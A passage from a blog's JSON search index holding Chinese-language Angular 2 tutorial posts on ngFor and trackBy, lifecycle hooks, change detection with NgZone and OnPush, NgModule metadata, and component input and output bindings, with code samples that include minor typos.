(routerNavigate)=\"routerNavigate($event)\"&gt;&lt;/list-li&gt;&lt;/li&gt; 赋值给*ngFor的字符串不是一个模板表达式，前面的星号不能省略，这个Angular提供的语法糖。Angular会遍历出contacts对象数据中的每个contact，并将它存储在局部变量contact中，使其在每个循环迭代中对模板HTML可用。 NgFor中的索引NgFor指令支持一个可选的index索引，在循环迭代过程中，其下表范围是0 &lt;= index &lt; 数组长度。可以通过模板输入变量来捕获这个index，并应用在模板中。如把index赋值给变量i后，在当前的元素及其子元素中都可以使用该变量：1&lt;div *ngFor=\"let contact of contacts; let i = index\"&gt;&#123;&#123; i + 1 &#125;&#125; - &#123;&#123; contact.id &#125;&#125;&lt;/div&gt; NgForTrackBy在一些包含复杂列表的项目中，每次更改都会引发很多相互关联的DOM操作，这里使用NgFor指令会让性能变得很差，在通讯录例子中，当重新从服务器拉取列表数据，拉取到的数据可能包含很多（部分数据）之前显示过的数据，虽然这些数据中的联系人标号（contact.id）没有发生变化，但Angular并不知道那些列表数据在数据更新前已经渲染过，只能清理旧列表的DOM元素，并用新列表数据填充DOM元素来重新建立一个新列表。 这种情况下，可以通过追踪函数来避免这种重复渲染的性能浪费，追踪函数可以让Angular将具有相同id的对象处理成同一个联系人：123trackByContacts(index: number, contact: Contact)&#123; return contact.id;&#125; 然后通过NgForTrackBy指令设置追踪函数：1&lt;div *ngFor=\"let contact of contacts; trackBy: trackByContacts\"&gt;&#123;&#123; contact.id &#125;&#125;&lt;/div&gt; 若检查出同一个联系人的属性发生了变化，Angular会更新DOM元素，反之就会留下这个DOM元素，使用NgForTractkBy指令的最终效果就是让列表界面变得更加顺畅，响应更及时。","categories":[{"name":"Angular","slug":"Angular","permalink":"https://github.com/xmoyKING/categories/Angular/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"typescript","slug":"typescript","permalink":"https://github.com/xmoyKING/tags/typescript/"},{"name":"angular","slug":"angular","permalink":"https://github.com/xmoyKING/tags/angular/"}]},{"title":"Angular2入门-组件-2","slug":"angular3","date":"2017-10-03T10:28:11.000Z","updated":"2017-12-06T14:50:08.821Z","comments":true,"path":"2017/10/03/angular3/","link":"","permalink":"https://github.com/xmoyKING/2017/10/03/angular3/","excerpt":"","text":"组件生命周期组件的生命周期由Angular内部管理，从组件的创建、渲染，到数据变动事件的触发，再到组件从DOM中移除，Angular都提供了钩子函数。 生命周期钩子通过实现一个或多个生命周期钩子（接口），从而在生命周期的各阶段做出适当的处理，这些钩子接口包含在@angular/core中，每个接口都对应一个名为”ng+接口名”的方法，例如OnInit接口有一个叫ngOnInit的钩子方法：1234567class ExampleInitHook implements OnInit &#123; constructor() &#123;&#125; ngOnInit()&#123; console.log('OnOnit'); &#125;&#125; 以下为组件常用的生命周期钩子方法，Angular会按顺序依次调用： ngOnChanges ngOnInit ngDoCheck ngAfterContentInit ngAfterContentChecked ngAfterViewInit ngAfterViewChecked ngOnDestroy除外，有些组件还有特殊的钩子，例如路由有routerOnActivate钩子。 ngOnChangesngOnChanges是用来响应组件输入值变化时触发的事件，该方法接收一个SimpleChanges对象，包含当前值和变化前的值，该方法在ngOnInit前触发，或当数据绑定输入属性的值发生变化时触发。 在AngualrJS1.x中，若需要监听数据的变化，需要设置$scope.$watch，在每次digest循环里判断数据是否有改变。Angular2中，ngOnChanges钩子简化了该过程，只要在组件里定义ngOnChanges方法，在输入数据发生变化时该方法就会被自动调用。 注意，这里的输入数据是指通过@Input装饰器显式指定的那些。 ngOnInitngOnInit钩子是用于数据绑定输入属性之后初始化组件，使用ngOnInit的原因为： 组件钩子后不久就要进行复杂的初始化 需要在输入属性设置完成之后才能构建组件在组件中，一般通过ngOnInit获取数据而不通过组件构造函数获取数据的原因是： 构造函数做的事（例如成员变量初始化）应该尽可能简单 对Angular自动化测试的一些场景非常有用，将业务相关的初始化代码放到ngOnInit里可以很容易进行Hook操作，而钩子函数不能被显示调用，因此无法进行Hook操作。 ngDoCheck用于变化监测，该方法会在每次变化发生时被调用。每个变化监测周期内，不管数据值是否变化，ngDoCheck都会被调用，但这个钩子方法要慎用，例如mousemove事件，会被频繁触发，随之ngDoCheck也会被频繁调用，因此ngDoCheck不能处理复杂逻辑。 据大多数情况下，ngDoCheck和ngOnChanges不同时使用，ngOnChengs能做的ngDoCheck也能做，而ngDoCheck检测粒度更小，可以完成更灵活的变化监测逻辑。 ngAfterContentInit在组件中使用ng-content将外部内容嵌入到组件视图后就会调用ngAfterContentInit，它在第一次ngDoCheck执行后调用，且只执行一次。 ngAfterContentCheckedAngular在这些外部内容嵌入到组件视图后，或每次变化时就会调用ngAfterContentChecked。 ngAfterViewInit会在Angular创建了组件的视图及其子视图后被调用。 ngAfterViewChecked在Angular创建了组件的视图及其子组件视图之后被调用一次，并在每次子组件变化时被调用。 ngOnDestroy在销毁指令、组件之前触发。那些不会被垃圾回收器自动回收的资源，如已订阅的观察者事件、绑定过的DOM事件、通过setTimeout或setInterval设置过的计时器等，都应该在ngOnDestroy中手动销毁掉，从而避免发生内存泄漏等问题。 变化检测异步事件的发生导致组件中数据的变化，Angular对于这并不会捕捉对象的变动，它采用的是在适当的时机去检验对象的值是否被改动，这个时机是由NgZone服务掌握的，它获取整个应用的执行上下文，能够对相关的异步事件发生、完成、异常进行捕捉，然后驱动Angular的变化监测机制执行。 数据变化的源头在应用程序中，大致有3中引起数据变化的场景： 用户的操作，如click、change、hover等， 前后端的交互，如从后端服务拉去页面所需的接口数据，如XHR/WebSocket， 定时任务，在某个延时后再来响应对应的操作，如setTimeout、setInterval、requestAnimationFrame等。它们的共同特征就是它们其实都是异步处理，通过异步回调函数句柄来处理相关数据操作，因此，任意一个异步操作，都有可能在数据层面上发生改变，这会导致应用状态改变。若可以在每一个异步回调函数执行结束后，通知Angular内核进行变化监测，那么任何数据的更改就可以在视图层实时的反馈出来。 例如在组件的模版元数据template中：1&lt;i [ngClass]=\"&#123;collect: detail.collection&#125;\" (click)=\"collectTheContact()\"&gt;收藏&lt;/i&gt; 当用户单击收藏按钮，这个操作会改变组件里的收藏数据对象detail.collection，并将通知Angular去检查数据的变化，在视图层做出相应的改变，如改变DOM元素样式。 变动通知机制Angular本身不具备捕获异步事件的机制，所以引入了NgZone服务。NgZone服务基于Zones来实现，NgZone从Zone中fork了一份实例，是Zone派生出来的一个子Zone，在Angular环境内注册的异步事件都会运行在这个子Zone上（这个子Zone有用Angular运行环境的执行上下文）。NgZone扩展了一些API并添加了一些方法，如onUnstable和onMicrotaskEmpty事件，这些钩子方法会捕获对应的异步操作。 NgZone提供了一些可被订阅的自定义事件，这些自定义事件是Ovservable流，包括： onUnstable 在Angular单次事件启动前，触发消息通知订阅器 onMicrotaskEmpty 在Zone完成当前Angular单次事件任务时，立即通知订阅者 onStable 在完成onMicrotaskEmpty回调函数后，在视图变化之前立即通知订阅者，常用来验证应用的状态这些自定义事件在跟踪定时任务和其他异步任务时非常又有哪个，而且Angular可以决定在Zone内需不需要执行变化监测，因为有时需要Angular每一次都去执行变化监测，例如NgZone的runOutsideAngular()方法可以让Angular不执行变化监测，即通知NgZone的父Zone在捕获异步事件时直接返回，不触发后续的onMicrotaskEmpty事件。 通过Angular源码中ApplicationRef类可帮助理解NgZone，在该类的钩子函数中监听NgZone中的onMicrotaskEmpty自定义事件，只要有任何异步任务发生将触发这个事件，其中的tick()方法用来通知Angular去执行变化检测：1234567891011// 精简后的源码class ApplicationRef &#123; changeDetectorRefs: ChangeDetectorRef[] = []; constructor(private zone: NgZone)&#123; this.zone.onMicrotaskEmpty.subsribe(() =&gt; this.zone.run(() =&gt; this.tick() )); &#125; tick()&#123; this.changeDetectorRefs.forEach((ref) =&gt; ref.detectChanges()); &#125;&#125; 变化监测的响应处理Angular应用由大大小小的组件组成，这些相互依赖的组件构成了一颗线性的组件树，然后每一个组件有自己的变化监测器，由此组成了一颗变化监测树。变化监测树的数据由上到下单向流动，因为变化监测的执行总是从根组件开始，从上而下地监测每一个组件的变化，单向的数据流让人清晰地了解视图中数据的来源，明白数据的变化是由那个组件引起的。 变化监测器的工作原理为：当组件中数据有变动时，NgZone通过钩子捕获到变化并通知到Angular去执行变化监测，变化监测是单向线性的，即从根组件开始，依次触发各个子组件的变化监测器去完成变化的对比工作。在每个组件的执行环境中，Angular都会创建一个变化监测类的实例，该实例能够准确的记录每个组件的数据模型，并以此作为下一轮变化监测的参考标准。 默认情况下，任何一个组件模型中的数据变化都会导致整个组件树的变化监测，但其实很多组件的输入属性是没有变化的，因此没有必要对这样的组件进行变化监测操作，减少不必要的监测操作可以提升性能。 变化监测类（ChangeDetectorRef）Angular会在运行期间为每一个组件创建变化监测类的实例，该实例提供了相关的方法来手动管理变化监测。虽然Angular并不知道那个组件发生了变化，但开发者知道，所以可以给这个组件做标记，依次来通知Angular仅仅监测这个组件所在的路径上的组件即可。 变化监测类（ChangeDetectorRef）提供的主要接口如下：12345678class ChangeDetectorRef &#123; // ... markForCheck(): void // 把根组件到该组件之间的这条路径标记起来，通知Angular在下次触发变化监测时必须检查这条路径上的组件 detach(): void // 从变化监测树中分离变化监测器，该组件的变换监测器将不在执行变化监测，除非再次手动执行reattach()方法 detectChanges(): void // 手动触发执行该组件到各个子组件的一次变化监测 reattach(): void // 把分离的变化监测器重新安装上，使得该组件及其子组件都能执行变化监测&#125; 通过示例说明一些使用场景，假如通讯录中联系人的数据时刻在变化，而产品需求又不需要实时的根据变化来展示数据，那么为了性能考虑，可以设置在一定事件范围内来执行变化监测，detach方法和detachChanges方法配合使用：1234567891011121314151617181920212223242526272829303132333435// ...@Component(&#123; selector: 'list', template: ` &lt;ul class=\"list\"&gt; &lt;li *ngFor=\"let contact of contacs\"&gt; &lt;list-item [contact]=\"contact\"&gt;&lt;/list-item&gt; &lt;/li&gt; &lt;/ul&gt; `&#125;)export class ListComponent implements OnInit &#123; contacts: any = &#123;&#125;; constructor( // ... private cd: ChangeDetectorRef )&#123; cd.detach(); // 定时执行变化监测 setInterval(()=&gt;&#123; this.cd.detactChanges(); &#125;, 5000); &#125; ngOnInit()&#123; this.getContacts(); &#125; getContacts()&#123; this.contacts = data; // data为联系人列表数据 &#125; // ...&#125; 变化监测策略在Angular中，每个组件都包含一些元数据，而其中一些是可选的，changeDetection是可选的组件的元数据，其作用是让开发者定义每个组件的变化监测策略，在使用时前需要导入ChangeDetectionStrategy对象：12345678import &#123; Component, ChangeDetectionStrategy &#125; from '@angular/core';// ...@Component(&#123; // ... changeDetection: ChangeDetectionStrategy.OnPush&#125;)// ... ChangeDetectionStrategy是枚举类型，有2种值分别是Defult和OnPush，Default表示组件的每次变化监测都会检查其内部的所有数据，引用对象会深度遍历。而OnPush表示组件变化监测只检查输入属性（即@Input()修饰的变量），引用类型则只比对引用。 显然OnPush策略相比Default降低了变化监测的复杂度，尤其是子组件的更新只依赖输入属性的值时，在子组件上使用OnPush策略就非常好。但由于OnPush对引用类型仅比对引用，某些情况会出问题，比如，子组件通过输入属性获取父组件中的Object值为{a:1, b:2},但当父组件修改了该对象内的值为{a:11, b:22}，这时对象的引用没有发生变化，因此子组件的变化监测并不能感知对象已变化，此时解决方法有2个： 修改变化策略为Default，但牺牲性能 使用Immutable对象传值（推荐做法）使用Immutable对象可以确保当对象值的引用地址不变时，对象内部的值或结构也会保持不变，反之，当对象内部变化时，对象引用必然变化。 例如子组件代码如下：12345678910111213141516import &#123; Component, Inpu, ChangeDetectionStrategy &#125; from '@angular/core';@Component(&#123; selector: 'list-item', template: ` &lt;div&gt; &lt;label&gt;&#123;&#123; contact.get('name') &#125;&#125;&lt;/label&gt; &lt;span&gt;&#123;&#123; contact.get('telName') &#125;&#125;&lt;/span&gt; &lt;/div&gt; `, changeDetection: ChangeDetectionStrategy.OnPush&#125;)export class ListItemComponent &#123; @Input() contact: any = &#123;&#125;; // ...&#125; 子组件的数据更新只依赖输入属性contact的值，所以使用OnPush可以满足需求。父组件代码如下：123456789101112131415161718192021222324import &#123; Component &#125; from '@angular/core';import Immutable from 'immutable';@Component(&#123; // ... template: ` &lt;lit-item [contact]=\"contactItem\"&gt;&lt;/list-item&gt; &lt;button (click)=\"doUpdate()\"&gt;更新&lt;/button&gt; `, changeDetection: ChangeDetectionStrategy.OnPush&#125;)export class ListComponent &#123; contactItem: any; constructor()&#123; this.contactItem = Immutable.map(&#123; name: '张三', telName: '12341234123' &#125;) &#125; doUpdate()&#123; this.contactItem = this.contactItem.set('telNum', '12312312345'); &#125;&#125; 父组件引入Immutable工具库，并把contactItem包装成Immutable对象，当点击更新按钮时，contactItem值被赋值为新的对象引用，子组件检测到contactItem的引用变化，从而触发数据更新。 元数据说明除了上述已经讲解了的，还有其他一些元数据： 名称 类型 作用 selector string 自定义组件的标签，用于匹配元素 inputs string[] 指定组件的输入属性 outputs string[] 指定组件的输出属性 host {[key: string]: string;} 指定指令/组件的事件、动作和属性等 providers any[] 指定该组件及其所有子组件（含ContentChildren）可用的服务（依赖注入） exportsAs string 给指令分配一个变量，使得可以在模版中调用 moduleId string 包含该组件模块的id，它被用于解析模版和样式的相对路径 queries {[key: string]: any;} 设置需要被注入到组件的查询 viewProviders any[] 指定该组件及其所有子组件（不含ContentChildren）可用的服务 changeDetection ChangeDetectionStrategy 指定使用的变化监测策略 templateUrl string 指定组件模版所在的路径 template string 指定组件的内联模版 styleUrls string[] 指定组件引用的外部样式文件 styles string[] 指定组件使用的内联样式 animations AnimationEntryMetadata[] 设置Angular动画 encapsulation ViewEncapsulation 设置组件的视图包装选项 interpolation [string, string] 设置自定义插值标记，默认是双大括号｛｛｝｝","categories":[{"name":"Angular","slug":"Angular","permalink":"https://github.com/xmoyKING/categories/Angular/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"typescript","slug":"typescript","permalink":"https://github.com/xmoyKING/tags/typescript/"},{"name":"angular","slug":"angular","permalink":"https://github.com/xmoyKING/tags/angular/"}]},{"title":"Angular2入门-组件-1","slug":"angular2","date":"2017-10-03T01:42:08.000Z","updated":"2017-12-06T14:50:08.821Z","comments":true,"path":"2017/10/03/angular2/","link":"","permalink":"https://github.com/xmoyKING/2017/10/03/angular2/","excerpt":"","text":"组件(Component)是构成Angular应用的基础和核心，通俗的讲，组件用来包装特定的功能，应用程序的有序运行依赖于组件之间的协同工作。本部分内容主要有：了解组件化的发展和Web Component标准是如何形成的，以及Angular如何向Web Component靠齐。从如何创建组件到组件的构成、以及组件和模块的关系、从基础深入学习组件的元数据、生命周期、组建交互以及变化监测机制等内容。 组件基础创建Angular组件有3个步骤： 从@angular/core中引入Component装饰器 建立一个普通的类，并用@Component装饰它 在@Component中，设置selector自定义标签和template模版 比如创建一个显示名称和电话的联系人卡片来说明组件的创建方法，联系人卡片ContactItemComponent组件的示例代码如下：12345678910111213// contactItem.component.tsimport &#123; Component &#125; from '@angular/core';@Component(&#123; // 1 selector: 'contact-item', // 2 template: ` &lt;div&gt; &lt;p&gt;张三&lt;/p&gt; &lt;p&gt;13812341234&lt;/p&gt; &lt;/div&gt; ` // 3&#125;)export class ContactItemComponent &#123;&#125; // 4 使用组件需要在HTML中添加&lt;contact-item&gt;自定义标签，然后Angular便会在此标签中插入ContactItemComponent组件中指定的模版。 在组件的基础构成中： 组件装饰器（Component Decorator）：每个组件类必须用@Component进行装饰才能成为Angular组件 组件元数据（Component Metadata）：selector、template、…（以及其他） 模版：每个组件都会关联一个模版，这个模版最终会渲染到页面上，页面的这个DOM元素就是此组件实例的宿主元素 组件类：组件实际上也就是一个普通的类，组件的逻辑都在组件类里定义并实现 组件装饰器@Component是TypeScript的语法，它是一个装饰器，任何一个Angular组件都会用这个装饰器修饰，若移除这个装饰器，它将不再是Angular组件。由于浏览器不能直接解释TypeScript代码，最终组件的代码会通过TypeScript解析器转换成JS代码，转换后的代码如下：1234567891011121314151617var ContactItemComponent = (function()&#123; function ContactItemComponent()&#123;&#125; ContactItemComponent = __decoratre([ core_1.Component(&#123; selector: 'contact-item', template: ` &lt;div&gt; &lt;p&gt;张三&lt;/p&gt; &lt;p&gt;13812341234&lt;/p&gt; &lt;/div&gt; ` &#125;) __metadata('design:paramtypes', []) ], ContactItemComponent); return ContactItemComponent;&#125;()); 转换后，Angular的@Component会被转换成一个__decorate()方法，元数据的定义通过core_1.Component传入，将ContactItemComponent这个类装饰起来，使得ContactItemComponent有装饰器里定义的元数据属性，所以装饰器可以理解为对组件封装的语法糖，方便编写Angular的组件。 组件元数据在ContactItemComponent这个组件里的@Component装饰器部分，使用了大部分需要的元数据 —— 用于定义组件的标签名selector、用于定义组件宿主元素模版的template（template用于定义内联模版，templateUrl用于引用外联模版），styles用于提供内联样式，styleUrls用于引用外联样式。 其中styles和styleUrls可以同时指定，同时指定时，styles中的样式会先被解析，然后才会解析styleUrls中的样式，即styles会被styleUrls样式覆盖。而若直接在模版的DOM节点上写样式，则是作为优先级最高的模版内联样式（Template Inline Style）。一般使用styleUrls，方便管理，代码更清晰。 通过styles和styleUrls指定的样式时，Angular会在模版DOM中添加自定义的节点属性，依次来形成属于这些样式在组件中独有的作用域，避免CSS样式命名污染。 同时，也可以使用一些CSS预处理器来编写CSS代码，如SASS, 只要在webpack.config.js中的loaders配置一下：1234567&#123; module: &#123; loaders: [ &#123;test: /\\.scss/, loader: 'raw-loader!sass-loader', exclude: /node_modules/&#125; ] &#125;&#125; 然后通过npm install sass-loader安装sass-loader后即可在styleUrls中用require方法引入sass文件， 123456789101112131415@Component(&#123; selector: 'contact-item', template: ` &lt;div&gt; &lt;p&gt;张三&lt;/p&gt; &lt;p&gt;13812341234&lt;/p&gt; &lt;/div&gt; `, styles: [ `li:last-child&#123; border-bottom: none; &#125;` ], styleUrls: ['app/list/item.component.css', require('app/list/item.component.sass')]&#125;) 模版每个组件都必须设置一个模版，Angular才能将组件内容渲染到DOM上，这个DOM元素被称为宿主元素，与宿主元素交互的形式包括： 显示数据，用插值语法｛｛｝｝来显示组件的数据 双向数据绑定，使用形如[(ngModel)]=&quot;property&quot; 监听宿主元素事件以及调用组件方法，形如(click)=&quot;addContact()&quot;这样的就表示绑定单击事件，单击时触发addContact()方法 12345678910111213141516import &#123; Component &#125; from '@angular/core';@Component(&#123; selector: 'contact-item', template: ` &lt;div&gt; &lt;input type=\"text\" value=\"&#123;&#123;name&#125;&#125;\" [(ngModel)]=\"name\"/&gt; &lt;p (click)=\"addContact()\"&gt;&#123;&#123;name&#125;&#125;&lt;/p&gt; &lt;p&gt;&#123;&#123;phone&#125;&#125;&lt;/p&gt; &lt;/div&gt; `&#125;)export class ContactItemComponent &#123; name: string = '张三'; phone: string = '12341234123';&#125; 组件与模块通常组件是不会独立存在的，而是与其他组件写作，完成一个功能，在Angular中，这样的功能一般会封装到一个模块里，模块是在组件之上的一层抽象，组件以及指令、管道、服务、路由等都能通过模块去组织。 Angular提供了@NgModule装饰器来创建模块，一个应用可以有多个模块，但有且只有一个根模块（Root Module）,其他模块叫做特性模块（Feature Module）。根模块是启动应用的入口模块，根模块必须通过bootstrap元数据来指定应用的根组件，然后通过bootstrapModule()方法来启动应用。1234567891011// app.module.tsimport &#123; NgModule &#125; from '@angular/core';import &#123; BrowserModule &#125; from '@angular/platform-browser';import &#123; ContactItemComponent &#125; from './contactItem.component';@NgModule(&#123; imports: [BrowserModule], declarations: [ContactItemComponent], bootstrap: [ContactItemComponent]&#125;)export class AppModule&#123;&#125; 然后创建一个app.ts，利用platformBrowserDynamic().bootstrapModule()方法来启动这个根模块，这样Angular应用就能运行起来，并将ContactItemComponent组件的内容展示到页面上：12345// app.tsimport &#123; platformBrowserDynamic &#125; from '@angular/platform-browser-dynamic';import &#123; AppModule &#125; from './app.module';platformBrowserDynamic().bootstrapModule(AppModule); NgModule主要的元数据如下： declarations： 用于指定属于这个模块的视图类（View Class），即指定那些部分组成了这个模块，Angular有组件、指令和管道三种视图类，这些视图类只能属于一个模块，所以要注意不要再次声明属于其他模块的类。 imports：引入到该模块依赖的其他模块或路由，引入后模块里的组件模版才能引用外部对应的组件、指令、管道。 exports：导出视图类，当该模块被引入到外部模块时，这个实现指定了外部模块可以使用该模块的那些类视图类，所以它的值类型跟declarations一致（组件、指令、管道）。 providers：指定模块依赖的服务，引入后该模块中的所有组件都可以使用这些服务。 bootstrap：用于指定应用的根组件。 视图类引入以通讯录示例的app.module.ts文件中的declarations元数据为例：1234567891011121314// ...@NgModule(&#123; declarations: [ AppComponent, ListComponent, ListItemComponent, DetailComponent, CollectionComponent, EditComponent, HeaderComponent, FooterComponent, PhonePipe, BtnClickDirective ] // ...&#125;)export class AppModule &#123; &#125; 其中PhonePipe是管道、BtnClickDirective是指令，其他都是组件。比如ListComponent组件的模版代码list.component.html中使用到了HeaderComponent、FooterComponent以及ListItemComponent等3个组件，这时候必须在ListComponent所属的模块（即AppModule）中，通过declarations引入这3个组件。1234567891011&lt;!-- list.component.html --&gt;&lt;!-- 组件中指定了HeaderComponent, 才能使用my-header标签 --&gt;&lt;my-header title=\"所有联系人\" [isShowCreateButton]=\"true\"&gt;&lt;/my-header&gt;&lt;ul class=\"list\"&gt; &lt;li *ngFor=\"let contact of contacts\"&gt; &lt;!-- 组件中指定了ListItemComponent才能使用list-item标签 --&gt; &lt;lit-item [contact]=\"contact\" (rooterNavigate)=\"routerNavigate($event)\"&gt;&lt;/list-item&gt; &lt;/li&gt;&lt;/ul&gt;&lt;!-- 组件中指定了FooterComponent, 才能使用my-footer标签 --&gt;&lt;my-footer&gt;&lt;/my-footer&gt; 在引入BrowserModule的时已经引入了常用的内置指令，其中的ngFor就是Angular的内置指令。 导出视图类以及导入依赖模块有时候模块中的组件、指令、管道可能会在其他模块中使用，可使用exports元数据对外暴露这些组件、指令、管道。 比如通讯录模块ContactModule中联系人信息组件可能需要被短信模块MessageModule使用：123456789// contact.module.tsimport &#123; NgModule &#125; from '@angular/core';import &#123; ContactItemComponent &#125; from './contactItem.component';@NgModule(&#123; declarations: [ContactItemComponent], exports: [ContactItemComponent] // 导出组件&#125;)export class ContactModule &#123;&#125; 在短信模块，需要将依赖的ContactModule模块引入，让就可以在MessageMudule中的其他模版使用ContactModule导出的ContactItemComponent组件。12345678910// message.module.tsimport &#123; NgModule &#125; from '@angular/core';import &#123; ContactModule &#125; from './contact.module';import &#123; SomeOtherComponent &#125; from './someother.component';@NgModule(&#123; declarations: [SomeOtherComponent], // 在SomeOtherComponent组件的模版中就可以使用contact-item组件了。 imports: [ContactModule] // 导出组件&#125;)export class MessageModule &#123;&#125; 服务引入服务通常用于处理业务逻辑及其相关的数据，引入服务有两种方式：一是通过@NgModule的providers，另一个是通过@Component的providers。以app.module.ts文件中，通过providers元数据注入了自定义的ContactService服务，ContactService服务是维护联系人数据的主服务，负责对联系人信息的相关操作：1234567891011// app.module.tsimport &#123; ContactService, UtilService, FooterComponent, HeaderComponent, PhonePipe, BtnClickDirective &#125; from './shared';// ...@NgModule(&#123; providers: [ContactService], bootstrap: [AppComponent]&#125;)export class AppModule &#123; // ...&#125; 通过@NgModule的providers来注入服务，所有被包含在AppModule中的组件，都可以使用到这些服务，同样，在组件中也可以用providers来引入服务，该组件及其子组件都可以公用这些引入的服务。 组件交互Angular应用由各式各样的组件组成，这些组件形成了一颗组件树，数据可以在组件树里完成交互，组件间的交互包括父子组件交互和一些非父子组件的交互，组件交互就是组件通过一定的方式来访问其他租价你的属性或方法，从而实现数据双向流动。 组件的输入输出属性Angular提供了输入（@Input）和输出（@Output）语法来处理组件数据的流入流出，参照通讯录例子中item.component.ts以及list.component.html的代码：123456// item.component.tsexport class ListItemComponent implements OnInit &#123; @Input() contact:any = &#123;&#125;; @Output() routerNavigate = new EventEmitter&lt;number&gt;(); //...&#125; 12345&lt;!-- list.component.html --&gt;&lt;li *ngFor=\"let contact of contacts\"&gt; &lt;!-- 组件中指定了ListItemComponent才能使用list-item标签 --&gt; &lt;lit-item [contact]=\"contact\" (rooterNavigate)=\"routerNavigate($event)\"&gt;&lt;/list-item&gt;&lt;/li&gt; 上述ListItemComponent组件的作业是显示单个联系人的信息，由于联系人列表数据是在ListComponent组件中维护的，在显示单个联系人时，需要给ListItemComponent传入单个联系人数据，另外在单击单个联系人时，需要跳转到此联系人的明细信息，需要子组件通知父组件进行跳转，因此上述代码分别自定义了[contact]和(routerNavigate)的输入输出变量，用于满足上述功能。 被@Input修饰的contact变量属于输入属性，而被@Output修饰的routerNavigate则是输出属性，这里的输入、输出是以当前组件角度说的。除了@Input和@Output修饰外，还可以在组件的元数据中使用inputs、outputs来设置输入输出属性，设置的值必须为字符串数组，元素的名称需要和成员变量相对应：1234567891011// 等价为上述代码@Component(&#123; // ... inputs: ['contact'], // 'contact'匹配成员变量contact outputs: ['routerNavigate']&#125;)export class ListItemComponent implements OnInit &#123; contact:any = &#123;&#125;; routerNavigate = new EventEmitter&lt;number&gt;(); //...&#125; 父组件向子组件传递数据父组件的数据通过子组件的输入属性流入子组件，在子组件完成接收或拦截，以此实现数据由上而下的传递。 父组件ListComponent将获取到联系人的数据，通过属性绑定的方式流向子组件ListItemComponent：1234567891011121314151617// list.component.tsimport &#123; Component, OnInit &#125; from '@angular/core';@Component(&#123; selector: 'list', template: ` &lt;ul class=\"list\"&gt; &lt;li *ngFor=\"let contact of contacts\"&gt; &lt;list-item [contact]=\"contact\"&gt;&lt;/list-item&gt; &lt;/li&gt; &lt;/ul&gt; `&#125;)export class ListComponent implements OnInit &#123; // ... this.contact = data; // data为获取到的联系人数据&#125; 在app.module.ts中已经通过@NgModule的元数据declarations将子组件ListItemComponent的实例引入到AppModule中，使得所有属于AppModule中的其他组件都可以使用ListItemComponent组件，因此父组件ListComponent中可以直接引用该子组件，将每个联系人对象通过属性绑定的方式绑定到属性contact中来提供子组件的引用，数据由上而下流入子组件，在子组件中通过@Input装饰器完成数据的接收，子组件的示例代码如下：123456789101112131415// item.component.tsimport &#123; Component, OnInit, Input &#125; from '@angular/core'@Component(&#123; selector: 'list-item', template: ` &lt;div class=\"contact-info\"&gt; &lt;lable class=\"contact-name\"&gt;&#123;&#123; contact.name &#125;&#125;&lt;/label&gt; &lt;span class=\"contact-tel\"&gt;&#123;&#123; contact.telNum &#125;&#125;&lt;/span&gt; &lt;/div&gt; `&#125;)export class ListItemComponent implements OnInit&#123; @Input() contact: any = &#123;&#125;;&#125; ListItemComponent组件主要展示联系人姓名（name）和电话（telNum）,这两个属性包含在contact对象下，其数据是通过装饰器@Input来获取来自父组件的contact对象，数据由父组件流出，在子组件中通过输入属性@Input完成数据的接收。 Angular应用是由各式各样的组件组成的，Angular会从根组件开始启动，并解析整颗组件树，数据从上而下流入下一级子组件，但目标属性必须通过输入属性@Input明确的标记修饰才能接收到来自父组件的数据。 拦截输入属性父组件向子组件传递数据，子组件可以拦截输入属性的数据并进行处理，2种方式拦截，分别是setter拦截输入属性和ngOnChanges监听数据变化。 setter拦截输入属性getter和setter通常配套使用，用来对属性进行相关约束，setter可以对属性进行再封装处理，对复杂的内部逻辑通过访问权限控制来隔离外部调用，以避免外部的错误调用影响到内部的状态，同时把内部复杂逻辑结构封装成高度抽象且能被简单调用的属性，再通过getter返回要设置的属性值，方便调用。 对ListItemComponent进行修改：1234567891011121314151617181920@Component(&#123; selector: 'list-item', template: ` &lt;div class=\"contact-info\"&gt; &lt;lable class=\"contact-name\"&gt;&#123;&#123; contactObj.name &#125;&#125;&lt;/label&gt; &lt;span class=\"contact-tel\"&gt;&#123;&#123; contactObj.telNum &#125;&#125;&lt;/span&gt; &lt;/div&gt; `&#125;)export class ListItemComponent implements OnInit&#123; _contact: object = &#123;&#125;; @Input() set contactObj(contact: object)&#123; this._contact.name = (contact.name &amp;&amp; contact.name.trim()) || 'no name set'; this._contact.telNum = contact.telNum || '000-000'; &#125;; get contactObj()&#123; return this._contact&#125;;&#125; 如上处理的作业是使得联系人不会出现null或undefined的情况，一般来说，getter和setter其实是在该组件类的原型对象上设置的contactObj属性的方法：123Object.defineProperty(ListItemComponent.prototype, 'contactObj', &#123; // ...&#125;); ngOnChanges监听数据变化ngOnChanges用于及时响应Angular在属性绑定中发生的数据变化，该方法接收一个对象参数，包含当前值和变化前的值，在ngOnInit之前，或者当数据绑定的输入属性的值发生变化时会触发，ngOnChanges是组件的生命周期钩子之一。 在通讯录例子详情页中，当父组件DetailComponent编辑联系人信息后，在子组件ChangeLogComponent中通过ngOnChanges来监听并处理数据的变化，将变化前后信息通过日志输出。1234567891011121314151617// detail.component.tsimport &#123; Component &#125; from '@angular/core';@Component(&#123; selector: 'detail', template: ` &lt;a class=\"edit\" (clicj)=\"editContact()\"&gt;编辑&lt;/a&gt; &lt;change-log [contact]=\"detail\"&gt;&lt;/change-log&gt; `&#125;)export class DetailComponent implements OnInit &#123; detail: any = &#123;&#125;; editContact() &#123; // ... this.detail = data; //修改后的数据 &#125;&#125; 子组件ChangeLogComponent中，SimpleChanges类是Angular的一个基础类，用于处理数据的前后变化，其包含两个重要成员变量，分别是previousValue和currentValue。1234567891011121314151617181920212223242526// changelog.component.tsimport &#123; Component, Input, OnChanges, SimpleChanges &#125; from '@angular/core';@Component(&#123; selector: 'change-log', template: ` &lt;h4&gt;Change log: &lt;/h4&gt; &lt;ul&gt; &lt;li *ngFor=\"let change of changes\"&gt;&#123;&#123; change &#125;&#125;&lt;/li&gt; &lt;/ul&gt; `&#125;)export class ChangelogComponent implements OnChanges &#123; @Input() contact: any = &#123;&#125;; changs: string[] = []; ngOnChanges(changes: &#123;[propKey: string]: SimpleChanges&#125;) &#123; let log: string[] = []; for( let propName in changes)&#123; let changedProp = changes[propName], from = JSON.stringify(changedProp.previousValue), to = JSON.stringify(changedProp.currentValue); log.push(`$&#123;propName&#125; changed from $&#123;from&#125; to 